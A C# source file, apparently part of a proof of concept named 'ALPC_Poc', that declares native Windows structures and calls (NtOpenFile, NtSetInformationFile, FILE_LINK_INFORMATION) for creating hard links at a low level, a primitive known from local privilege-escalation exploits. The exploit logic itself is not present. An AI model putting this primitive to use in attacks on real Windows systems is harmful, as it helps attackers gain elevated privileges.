﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace ALPC_Poc
{
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public Int32 Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public UInt32 Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct IO_STATUS_BLOCK
    {
        public IntPtr Status;
        public IntPtr Information;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING
    {
        public UInt16 Length;
        public UInt16 MaximumLength;
        public IntPtr Buffer;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct FILE_LINK_INFORMATION
    {
        [MarshalAs(UnmanagedType.U1)]
        public bool ReplaceIfExists;
        public IntPtr RootDirectory;
        public UInt32 FileNameLength;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public String FileName;
    }
    public static class NtHardLink
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        public static extern UInt32 GetFullPathName(
            String lpFileName,
            UInt32 nBufferLength,
            System.Text.StringBuilder lpBuffer,
            ref IntPtr FnPortionAddress);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(
            IntPtr hObject);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtOpenFile(
            ref IntPtr FileHandle,
            UInt32 DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjAttr,
            ref IO_STATUS_BLOCK IoStatusBlock,
            UInt32 ShareAccess,
            UInt32 OpenOptions);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtSetInformationFile(
            IntPtr FileHandle,
            ref IO_STATUS_BLOCK IoStatusBlock,
            IntPtr FileInformation,
            UInt32 Length,
            UInt32 FileInformationClass);
    }
}
